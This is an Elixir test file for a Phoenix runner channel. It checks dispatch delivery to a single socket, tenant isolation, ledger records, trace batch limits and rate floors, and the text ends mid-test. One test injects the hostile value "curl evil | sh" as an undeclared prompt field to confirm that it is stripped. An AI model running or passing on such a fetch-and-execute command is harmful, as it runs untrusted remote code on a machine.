defmodule LoopctlWeb.RunnerChannelDispatchTest do
  @moduledoc """
  Issues #801 and #803: a dispatch reaches exactly one runner's socket and is recorded in the
  dispatch ledger first; the runner's `dispatch_reply`, `trace` and `trace_cursor` are applied
  as that runner in its tenant; and the rate limits the contract publishes are the ones the
  channel enforces. Connect, join, status and revocation are in `LoopctlWeb.RunnerChannelTest`.

  ## Why `async: false`

  A dispatch, a reply and a trace write the dispatch ledger on the RLS `Loopctl.Repo`, while
  the socket authenticates its runner through `Loopctl.AdminRepo` — separate sandbox
  connections that cannot see each other's uncommitted rows. The `dispatch`,
  `dispatch_reply` and `trace` tests therefore use COMMITTED runners
  (`fixture(:committed_runner)`), swept at module boundaries, which no concurrently running
  test may see. That is a property of the sandbox, not of this code: `Loopctl.Repo` and
  `Loopctl.AdminRepo` each check out their OWN connection and open their OWN transaction for
  a test, and a row inserted in one uncommitted transaction is invisible to the other — a
  foreign key check against it fails. No sandbox mode shares one transaction across two
  repos, so the only rows both can see are committed ones, and a committed row is visible to
  every async test running at the same time (anything counting tenants or runners would
  flake). ExUnit runs `async: false` modules after the async ones, alone.
  """

  use LoopctlWeb.ChannelCase, async: false

  alias Loopctl.ApiSpec.RunnerContract
  alias Loopctl.ApiSpec.RunnerContract.RunnerTraceBatch
  alias Loopctl.ApiSpec.RunnerContract.RunnerTraceEvent
  alias Loopctl.Auth
  alias Loopctl.Runners
  alias Loopctl.Runners.DispatchLedger
  alias Loopctl.Runners.DispatchRecord
  alias Loopctl.Runners.Presence
  alias Loopctl.Tenants
  alias LoopctlWeb.RunnerSocket

  setup :verify_on_exit!

  setup_all do
    sweep_committed_runner_tenants()
    on_exit(&sweep_committed_runner_tenants/0)
    :ok
  end

  # A BOUND on a real round trip, never a delay: every dispatch, reply and trace below waits
  # on a database transaction in the channel process, and the assertion returns the moment
  # the reply lands. ExUnit's 100 ms default is shorter than that under a loaded full suite.
  # Also the deadline of every `eventually/2` poll.
  @reply_timeout 2_000

  defp connect_info(token) do
    %{
      x_headers: [{RunnerSocket.token_header(), token}],
      peer_data: %{address: {127, 0, 0, 1}, port: 40_000, ssl_cert: nil}
    }
  end

  defp join_payload(machine, overrides \\ %{}) do
    Map.merge(
      %{
        "contract_version" => RunnerContract.version(),
        "machine" => machine,
        "cores" => 16,
        "memory_mb" => 28_000,
        "repos" => ["mkreyman/home_care_billing"],
        "max_sessions" => 2,
        "in_flight" => 0,
        "draining" => false
      },
      overrides
    )
  end

  defp connect_runner(token), do: connect(RunnerSocket, %{}, connect_info: connect_info(token))

  # Joins and waits for the channel to process :after_join (the Presence track).
  defp topic(socket), do: "runner:" <> socket.assigns.runner.id

  defp join_pool(socket, machine) do
    {:ok, reply, channel} = subscribe_and_join(socket, topic(socket), join_payload(machine))
    _ = :sys.get_state(channel.channel_pid)
    {reply, channel}
  end

  defp in_pool?(tenant_id, name), do: Map.has_key?(Runners.pool(tenant_id), name)

  # A dispatch payload for a real story at the dispatch's epoch, on the RLS connection the
  # ledger's claim fence reads.
  defp dispatch_payload(tenant_id, attrs \\ %{}) do
    attrs = Map.new(attrs)
    epoch = Map.get(attrs, "claim_epoch", 0)
    story = fixture(:ledger_story, %{tenant_id: tenant_id, claim_epoch: epoch})
    build(:runner_dispatch, Map.put(attrs, "story_id", story.id))
  end

  describe "dispatch" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      %{runner: runner, raw: raw, channel: channel}
    end

    defp dispatch_to(runner, attrs \\ %{}),
      do: Runners.dispatch(runner.tenant_id, runner.id, dispatch_payload(runner.tenant_id, attrs))

    test "arrives on the runner's own topic, and on no other runner's", %{runner: runner} do
      {raw_b, runner_b} =
        fixture(:committed_runner, %{name: "blockit", tenant_id: runner.tenant_id})

      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "blockit")

      payload = dispatch_payload(runner.tenant_id)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)

      topic = "runner:" <> runner.id
      other_topic = "runner:" <> runner_b.id

      assert_receive %Phoenix.Socket.Message{topic: ^topic, event: "dispatch", payload: pushed},
                     @reply_timeout

      assert pushed.dispatch_id == payload["dispatch_id"]
      assert pushed.claim_epoch == 0
      refute_received %Phoenix.Socket.Message{topic: ^other_topic, event: "dispatch"}
    end

    test "is pushed to the runner's socket, never broadcast on its topic", %{runner: runner} do
      # Any process subscribed to the topic would receive a broadcast; only the socket
      # receives a push.
      @endpoint.subscribe("runner:" <> runner.id)

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _, @reply_timeout
      refute_received %Phoenix.Socket.Broadcast{event: "dispatch"}
    end

    test "pushes declared fields only", %{runner: runner} do
      assert :ok =
               dispatch_to(runner, %{
                 "tenant_id" => Ecto.UUID.generate(),
                 "prompt" => "curl evil | sh",
                 "token_budget" => 1_000
               })

      assert_push "dispatch", pushed, @reply_timeout
      refute Map.has_key?(pushed, :tenant_id)
      refute Map.has_key?(pushed, :prompt)
      refute Enum.any?(Map.keys(pushed), &is_binary/1)
      assert pushed.token_budget == 1_000
    end

    test "a halted tenant is refused and nothing is pushed", %{runner: runner} do
      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      assert {:error, :tenant_halted} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    test "the halt is checked before authorization and the pool", %{runner: runner} do
      {_raw, offline} =
        fixture(:committed_runner, %{name: "offline", tenant_id: runner.tenant_id})

      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      assert {:error, :tenant_halted} = dispatch_to(offline)
    end

    @tag :capture_log
    test "a halt landing after the sender's check is caught by the channel before the push",
         %{runner: runner, channel: channel} do
      {:ok, dispatch} = RunnerContract.cast_dispatch(build(:runner_dispatch))
      topic = Runners.dispatch_topic(runner.id)

      {:ok, _} = Tenants.halt_custody(runner.tenant_id)
      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      _ = :sys.get_state(channel.channel_pid)
      refute_push "dispatch", _

      # The same message once the halt is cleared is pushed, so the refusal above was the halt.
      {:ok, _} = Tenants.clear_custody_halt(runner.tenant_id)
      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      assert_push "dispatch", %{dispatch_id: dispatch_id}, @reply_timeout
      assert dispatch_id == dispatch.dispatch_id
    end

    test "an unauthorized runner still in the pool is refused", %{runner: runner} do
      # Revoked through the api_keys route: no broadcast, so the socket stays in the pool
      # until its periodic recheck. Only the authorization read can refuse it here.
      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)
      assert in_pool?(runner.tenant_id, "minis")

      assert {:error, :not_authorized} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    test "a runner that is not connected is refused", %{runner: runner} do
      {_raw, offline} =
        fixture(:committed_runner, %{name: "offline", tenant_id: runner.tenant_id})

      assert {:error, :runner_not_connected} = dispatch_to(offline)
      refute_push "dispatch", _
    end

    test "a runner whose socket left the pool is refused", %{runner: runner, channel: channel} do
      Process.unlink(channel.channel_pid)
      ref = leave(channel)
      assert_reply ref, :ok, _, @reply_timeout
      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end, @reply_timeout)

      assert {:error, :runner_not_connected} = dispatch_to(runner)
    end

    test "a credential live on two sockets is refused", %{runner: runner, raw: raw} do
      {:ok, second} = connect_runner(raw)
      {_reply, _channel} = join_pool(second, "minis")

      assert {:error, :runner_ambiguous} = dispatch_to(runner)
      refute_push "dispatch", _
    end

    @tag :capture_log
    test "a second subscribed socket missing from the pool read gets no push; one push happens",
         %{runner: runner, raw: raw} do
      # The state a socket is in when `dispatch/3`'s pool read cannot see it: subscribed to
      # the runner's dispatches but absent from the pool (not yet tracked, or not yet in this
      # node's Presence view). Produced here by untracking a joined second socket.
      {:ok, second} = connect_runner(raw)
      {_reply, channel_b} = join_pool(second, "minis")
      :ok = Presence.untrack(channel_b.channel_pid, Runners.pool_topic(runner.tenant_id), "minis")

      assert eventually(
               fn -> length(Runners.live_metas(runner.tenant_id, runner.id)) == 1 end,
               @reply_timeout
             )

      assert :ok = dispatch_to(runner)

      # Both channels receive the broadcast; only the socket that is the pool's sole live
      # meta pushes. Both transports are this test process, so count every push.
      assert_receive %Phoenix.Socket.Message{event: "dispatch"}, @reply_timeout
      refute_receive %Phoenix.Socket.Message{event: "dispatch"}
    end

    @tag :capture_log
    test "a live meta the sender did not see stops the push", %{runner: runner} do
      {:ok, dispatch} = RunnerContract.cast_dispatch(build(:runner_dispatch))
      topic = Runners.dispatch_topic(runner.id)

      # A second live socket for this runner, as another node's Presence would report it.
      other =
        spawn(fn ->
          receive do
            :stop -> :ok
          end
        end)

      {:ok, _ref} =
        Presence.track(other, Runners.pool_topic(runner.tenant_id), "minis", %{
          runner_id: runner.id
        })

      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      refute_push "dispatch", _

      # Once it is gone the same message is pushed, so the refusal above was the second meta.
      send(other, :stop)

      assert eventually(
               fn -> length(Runners.live_metas(runner.tenant_id, runner.id)) == 1 end,
               @reply_timeout
             )

      Phoenix.PubSub.broadcast(Loopctl.PubSub, topic, {:runner_dispatch, dispatch})
      assert_push "dispatch", _, @reply_timeout
    end

    test "still pushes after a status update re-issues the socket's Presence ref",
         %{runner: runner, channel: channel} do
      ref = push(channel, "status", %{"in_flight" => 1})
      assert_reply ref, :ok, _, @reply_timeout

      assert eventually(
               fn ->
                 match?([%{in_flight: 1}], Runners.live_metas(runner.tenant_id, runner.id))
               end,
               @reply_timeout
             )

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _, @reply_timeout
    end

    test "is recorded in the ledger as sent, and a re-send of the same id adds no row",
         %{runner: runner} do
      payload = dispatch_payload(runner.tenant_id, %{"claim_epoch" => 4})

      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      record = DispatchLedger.get_record(runner.tenant_id, payload["dispatch_id"])
      assert %DispatchRecord{status: "sent", claim_epoch: 4} = record
      assert record.runner_id == runner.id

      # The retry of a push the channel may have dropped is sent again, onto the same row.
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout
      assert DispatchLedger.get_record(runner.tenant_id, payload["dispatch_id"]).id == record.id
    end

    test "a dispatch_id whose ledger row disagrees is refused before anything is pushed",
         %{runner: runner} do
      payload = dispatch_payload(runner.tenant_id)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      assert {:error, :dispatch_id_conflict} =
               Runners.dispatch(runner.tenant_id, runner.id, %{payload | "kind" => "triage"})

      refute_push "dispatch", _
    end

    test "a dispatch whose epoch is not the story's current one is refused and nothing is pushed",
         %{runner: runner} do
      payload = dispatch_payload(runner.tenant_id, %{"claim_epoch" => 3})

      assert {:error, :stale_claim_epoch} =
               Runners.dispatch(runner.tenant_id, runner.id, %{payload | "claim_epoch" => 2})

      refute_push "dispatch", _
      assert DispatchLedger.get_record(runner.tenant_id, payload["dispatch_id"]) == nil
    end

    test "a dispatch the runner already answered is not pushed again",
         %{runner: runner, channel: channel} do
      payload = dispatch_payload(runner.tenant_id)
      assert :ok = Runners.dispatch(runner.tenant_id, runner.id, payload)
      assert_push "dispatch", _, @reply_timeout

      ref = push(channel, "dispatch_reply", accept(payload))
      assert_reply ref, :ok, _, @reply_timeout

      assert {:error, :dispatch_already_replied} =
               Runners.dispatch(runner.tenant_id, runner.id, payload)

      refute_push "dispatch", _
    end

    test "a malformed payload is refused and nothing is pushed", %{runner: runner} do
      assert {:error, {:invalid, details}} =
               Runners.dispatch(
                 runner.tenant_id,
                 runner.id,
                 Map.delete(build(:runner_dispatch), "claim_epoch")
               )

      assert Enum.any?(details, &String.contains?(&1, "claim_epoch"))
      assert {:error, {:invalid, _}} = dispatch_to(runner, %{"kind" => "shell"})
      assert {:error, {:invalid, _}} = Runners.dispatch(runner.tenant_id, runner.id, nil)
      refute_push "dispatch", _
    end

    test "another tenant cannot reach this runner by id", %{runner: runner} do
      tenant_b = fixture(:committed_tenant, %{})
      {raw_b, runner_b} = fixture(:committed_runner, %{name: "minis", tenant_id: tenant_b.id})
      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "minis")

      assert {:error, :not_authorized} =
               Runners.dispatch(tenant_b.id, runner.id, build(:runner_dispatch))

      # Tenant B's own runner, joined under the same machine name, is still reachable by B.
      assert :ok = Runners.dispatch(tenant_b.id, runner_b.id, dispatch_payload(tenant_b.id))
      topic = "runner:" <> runner.id
      topic_b = "runner:" <> runner_b.id
      assert_receive %Phoenix.Socket.Message{topic: ^topic_b, event: "dispatch"}, @reply_timeout
      refute_received %Phoenix.Socket.Message{topic: ^topic, event: "dispatch"}
    end

    test "a halt on another tenant does not stop this one", %{runner: runner} do
      tenant_b = fixture(:committed_tenant, %{})
      {:ok, _} = Tenants.halt_custody(tenant_b.id)

      assert :ok = dispatch_to(runner)
      assert_push "dispatch", _, @reply_timeout
    end

    test "malformed ids address no runner", %{runner: runner} do
      assert {:error, :not_authorized} =
               Runners.dispatch("not-a-uuid", runner.id, build(:runner_dispatch))

      assert {:error, :not_authorized} =
               Runners.dispatch(runner.tenant_id, "not-a-uuid", build(:runner_dispatch))
    end
  end

  # The minimum intervals are per channel process; a test that sends several messages in a
  # row resets them rather than sleeping, so the rate-limit tests below are what cover them.
  defp reset_intervals(channel) do
    :sys.replace_state(channel.channel_pid, fn socket ->
      assigns = %{
        socket.assigns
        | reply_bucket: :full,
          last_trace_at: :never,
          last_cursor_at: :never
      }

      %{socket | assigns: assigns}
    end)
  end

  defp pin_interval(channel, key) do
    :sys.replace_state(channel.channel_pid, fn socket ->
      at = System.monotonic_time(:millisecond) + 60_000
      %{socket | assigns: Map.put(socket.assigns, key, at)}
    end)
  end

  defp drain_reply_bucket(channel) do
    :sys.replace_state(channel.channel_pid, fn socket ->
      at = System.monotonic_time(:millisecond) + 60_000
      %{socket | assigns: Map.put(socket.assigns, :reply_bucket, {0, at})}
    end)
  end

  defp send_trace(channel, payload) do
    reset_intervals(channel)
    push(channel, "trace", payload)
  end

  defp accept(dispatch, attrs \\ %{}) do
    Map.merge(
      %{
        "dispatch_id" => dispatch["dispatch_id"],
        "claim_epoch" => dispatch["claim_epoch"],
        "decision" => "accepted"
      },
      attrs
    )
  end

  defp status_of(runner, dispatch),
    do: DispatchLedger.get_record(runner.tenant_id, dispatch["dispatch_id"]).status

  describe "dispatch_reply" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = dispatch_payload(runner.tenant_id, %{"claim_epoch" => 2})
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      %{runner: runner, channel: channel, dispatch: dispatch}
    end

    test "accepted is recorded", %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end

    test "refused is recorded with its reason",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref =
        push(
          channel,
          "dispatch_reply",
          accept(dispatch, %{"decision" => "refused", "reason" => "repo_not_allowed"})
        )

      assert_reply ref, :ok, _, @reply_timeout

      assert %DispatchRecord{status: "refused", reason: "repo_not_allowed"} =
               DispatchLedger.get_record(runner.tenant_id, dispatch["dispatch_id"])
    end

    test "an identical repeat is ok; a conflicting one is already_replied",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout

      reset_intervals(channel)
      refusal = accept(dispatch, %{"decision" => "refused", "reason" => "draining"})
      ref = push(channel, "dispatch_reply", refusal)
      assert_reply ref, :error, %{reason: "already_replied"}, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end

    test "a stale claim_epoch is refused",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch, %{"claim_epoch" => 1}))
      assert_reply ref, :error, %{reason: "stale_claim_epoch"}, @reply_timeout
      assert status_of(runner, dispatch) == "sent"
    end

    test "another runner's dispatch is unknown", %{runner: runner, channel: channel} do
      {raw_b, runner_b} =
        fixture(:committed_runner, %{name: "blockit", tenant_id: runner.tenant_id})

      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "blockit")
      theirs = dispatch_payload(runner.tenant_id)
      :ok = Runners.dispatch(runner.tenant_id, runner_b.id, theirs)

      ref = push(channel, "dispatch_reply", accept(theirs))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout
      assert status_of(runner_b, theirs) == "sent"
    end

    test "another tenant's dispatch is unknown", %{channel: channel} do
      tenant_b = fixture(:committed_tenant, %{})
      {raw_b, runner_b} = fixture(:committed_runner, %{name: "minis", tenant_id: tenant_b.id})
      {:ok, socket_b} = connect_runner(raw_b)
      {_reply, _channel_b} = join_pool(socket_b, "minis")
      theirs = dispatch_payload(tenant_b.id)
      :ok = Runners.dispatch(tenant_b.id, runner_b.id, theirs)

      ref = push(channel, "dispatch_reply", accept(theirs))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout
      assert status_of(runner_b, theirs) == "sent"
    end

    test "an invalid reply is refused", %{channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch, %{"decision" => "refused"}))
      assert_reply ref, :error, %{reason: "invalid_payload"}, @reply_timeout
    end

    test "replies to several dispatches back to back are all applied, and each dispatch's trace is accepted",
         %{runner: runner, channel: channel, dispatch: first} do
      second = dispatch_payload(runner.tenant_id, %{"claim_epoch" => 2})
      :ok = Runners.dispatch(runner.tenant_id, runner.id, second)
      assert_push "dispatch", _, @reply_timeout

      # No reset between them: a single per-runner gap used to refuse the second reply.
      for dispatch <- [first, second] do
        ref = push(channel, "dispatch_reply", accept(dispatch))
        assert_reply ref, :ok, _, @reply_timeout
      end

      for dispatch <- [first, second] do
        assert status_of(runner, dispatch) == "accepted"

        run_id = Ecto.UUID.generate()

        ref =
          send_trace(channel, %{
            "run_id" => run_id,
            "dispatch_id" => dispatch["dispatch_id"],
            "claim_epoch" => 2,
            "events" => [build(:runner_trace_event, %{"run_id" => run_id, "seq" => 0})]
          })

        assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
      end
    end

    test "a reply past the burst is refused with the refill interval, and a refused reply is not applied",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      drain_reply_bucket(channel)

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :error, %{reason: "rate_limited", min_interval_ms: ms}, @reply_timeout
      assert ms == RunnerContract.dispatch_reply_burst()["refill_interval_ms"]
      assert status_of(runner, dispatch) == "sent"
    end

    test "an invalid reply spends no reply", %{channel: channel, dispatch: dispatch} do
      ref = push(channel, "dispatch_reply", accept(dispatch, %{"decision" => "refused"}))
      assert_reply ref, :error, %{reason: "invalid_payload"}, @reply_timeout
      assert :sys.get_state(channel.channel_pid).assigns.reply_bucket == :full
    end

    test "a NUL in a refusal's detail is invalid_payload, and the channel carries on",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      nul =
        accept(dispatch, %{"decision" => "refused", "reason" => "other", "detail" => "a\u0000b"})

      ref = push(channel, "dispatch_reply", nul)
      assert_reply ref, :error, %{reason: "invalid_payload"}, @reply_timeout
      assert Process.alive?(channel.channel_pid)

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"
    end

    test "a halted tenant can still record a reply and its trace",
         %{runner: runner, channel: channel, dispatch: dispatch} do
      {:ok, _} = Tenants.halt_custody(runner.tenant_id)

      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      assert status_of(runner, dispatch) == "accepted"

      batch =
        build(:runner_trace_batch, %{
          :seqs => [0],
          "dispatch_id" => dispatch["dispatch_id"],
          "claim_epoch" => 2
        })

      ref = push(channel, "trace", batch)
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
    end
  end

  describe "trace" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = dispatch_payload(runner.tenant_id)
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      ref = push(channel, "dispatch_reply", accept(dispatch))
      assert_reply ref, :ok, _, @reply_timeout
      reset_intervals(channel)

      %{runner: runner, channel: channel, dispatch: dispatch, run_id: Ecto.UUID.generate()}
    end

    defp batch(dispatch, run_id, seqs, attrs \\ %{}) do
      build(
        :runner_trace_batch,
        Map.merge(
          %{
            :seqs => seqs,
            "run_id" => run_id,
            "dispatch_id" => dispatch["dispatch_id"],
            "claim_epoch" => dispatch["claim_epoch"]
          },
          attrs
        )
      )
    end

    test "stores a batch once, and acks the contiguous seqs",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 3]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 3]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [2]))
      assert_reply ref, :ok, %{acked_seq: 3}, @reply_timeout
    end

    test "trace_cursor is -1 before anything is stored, then the acked seq",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: -1}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0, 1, 2]))
      assert_reply ref, :ok, %{acked_seq: 2}, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: 2}, @reply_timeout
    end

    test "a batch for an unknown dispatch, or at a wrong epoch, is refused",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      unknown = %{dispatch | "dispatch_id" => Ecto.UUID.generate()}
      ref = send_trace(channel, batch(unknown, run_id, [0]))
      assert_reply ref, :error, %{reason: "unknown_dispatch"}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0], %{"claim_epoch" => 7}))
      assert_reply ref, :error, %{reason: "stale_claim_epoch"}, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: -1}, @reply_timeout
    end

    test "a second run for the dispatch is refused",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, Ecto.UUID.generate(), [0]))
      assert_reply ref, :error, %{reason: "run_mismatch"}, @reply_timeout
    end

    test "a batch within the event count but over the byte budget is batch_too_large, and the channel carries on",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      max_bytes = RunnerTraceBatch.max_bytes()
      astral = <<0x1F600::utf8>>

      # Every string at its character limit in 12-byte-escaped characters: about 5 KB an
      # event, so the byte budget binds long before the event count does.
      heavy =
        update_in(
          batch(dispatch, run_id, Enum.to_list(0..(RunnerTraceBatch.max_events() - 1))),
          ["events", Access.all()],
          &Map.merge(&1, %{
            "event_id" => String.duplicate(astral, 128),
            "parent" => String.duplicate(astral, 128),
            "type" => String.duplicate(astral, 64)
          })
        )

      ref = send_trace(channel, heavy)

      assert_reply ref,
                   :error,
                   %{reason: "batch_too_large", max_bytes: ^max_bytes},
                   @reply_timeout

      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
    end

    test "an oversize batch and an oversize event are refused with their limits",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      max_events = RunnerTraceBatch.max_events()
      ref = send_trace(channel, batch(dispatch, run_id, Enum.to_list(0..max_events)))

      assert_reply ref,
                   :error,
                   %{reason: "batch_too_large", max_events: ^max_events},
                   @reply_timeout

      max_bytes = RunnerTraceEvent.max_data_bytes()
      big = %{"k" => String.duplicate("x", max_bytes)}
      oversize = put_in(batch(dispatch, run_id, [0]), ["events", Access.at(0), "data"], big)
      ref = send_trace(channel, oversize)

      assert_reply ref,
                   :error,
                   %{reason: "event_data_too_large", seq: 0, max_data_bytes: ^max_bytes},
                   @reply_timeout
    end

    test "the resume sequence is never rate limited: cursor, then batches, back to back",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      # The setup's reply spent no trace or cursor floor, and no reset happens here.
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: -1}, @reply_timeout

      ref = push(channel, "trace", batch(dispatch, run_id, [0, 1]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout
    end

    test "an invalid batch starts no floor, so its corrected resend is accepted at once",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      too_many = Enum.to_list(0..RunnerTraceBatch.max_events())
      ref = push(channel, "trace", batch(dispatch, run_id, too_many))
      assert_reply ref, :error, %{reason: "batch_too_large"}, @reply_timeout
      assert :sys.get_state(channel.channel_pid).assigns.last_trace_at == :never

      ref = push(channel, "trace", batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
    end

    test "an uppercase run_id is one run across batches",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      upper = String.upcase(run_id)

      ref = send_trace(channel, batch(dispatch, upper, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout

      ref = send_trace(channel, batch(dispatch, upper, [1]))
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout

      reset_intervals(channel)
      ref = push(channel, "trace_cursor", %{"run_id" => upper})
      assert_reply ref, :ok, %{acked_seq: 1}, @reply_timeout
    end

    test "a NUL in any runner-supplied string is invalid_payload, and the channel carries on",
         %{channel: channel, dispatch: dispatch, run_id: run_id} do
      nul = "a\u0000b"

      for change <- [
            %{"event_id" => nul},
            %{"parent" => nul},
            %{"type" => nul},
            %{"data" => %{"k" => nul}},
            %{"data" => %{nul => "v"}},
            %{"data" => %{"k" => ["ok", %{"deep" => nul}]}}
          ] do
        payload =
          update_in(
            batch(dispatch, run_id, [0]),
            ["events", Access.at(0)],
            &Map.merge(&1, change)
          )

        ref = send_trace(channel, payload)
        assert_reply ref, :error, %{reason: "invalid_payload"}, @reply_timeout

        assert Process.alive?(channel.channel_pid),
               "a NUL in #{inspect(change)} crashed the channel"
      end

      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
    end

    test "a batch records its time; a batch or cursor inside its OWN minimum interval is refused",
         %{runner: runner, channel: channel, dispatch: dispatch, run_id: run_id} do
      ref = send_trace(channel, batch(dispatch, run_id, [0]))
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout
      assert is_integer(:sys.get_state(channel.channel_pid).assigns.last_trace_at)

      pin_interval(channel, :last_trace_at)
      ref = push(channel, "trace", batch(dispatch, run_id, [1]))
      assert_reply ref, :error, %{reason: "rate_limited", min_interval_ms: _}, @reply_timeout

      # trace_cursor has its own floor, so a held-back trace does not hold it back.
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout

      pin_interval(channel, :last_cursor_at)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :error, %{reason: "rate_limited"}, @reply_timeout
      assert DispatchLedger.trace_cursor(runner.tenant_id, runner.id, run_id) == 0
    end
  end

  describe "the published rate floors" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = dispatch_payload(runner.tenant_id)
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      %{runner: runner, channel: channel, dispatch: dispatch}
    end

    # The message each event is exercised with, and the assign its floor is timed from.
    defp floor_cases(dispatch) do
      run_id = Ecto.UUID.generate()

      [
        {"status", :last_status_at, %{"in_flight" => 1}},
        {"trace", :last_trace_at,
         build(:runner_trace_batch, %{
           :seqs => [],
           "run_id" => run_id,
           "dispatch_id" => dispatch["dispatch_id"],
           "claim_epoch" => dispatch["claim_epoch"]
         })},
        {"trace_cursor", :last_cursor_at, %{"run_id" => run_id}}
      ]
    end

    test "the export publishes every inbound event's floor, and the channel refuses with that value",
         %{channel: channel, dispatch: dispatch} do
      published = RunnerContract.json_schema()["x-connection"]["limits"]["min_interval_ms"]
      events = for {event, _, _} <- floor_cases(dispatch), do: event
      assert Enum.sort(Map.keys(published)) == Enum.sort(events)

      for {event, assign, payload} <- floor_cases(dispatch) do
        assert published[event] == RunnerContract.min_interval_ms(event)

        pin_interval(channel, assign)
        ref = push(channel, event, payload)

        assert_reply ref,
                     :error,
                     %{reason: "rate_limited", min_interval_ms: refused_with},
                     @reply_timeout

        assert refused_with == published[event], "#{event} refuses with a different floor"
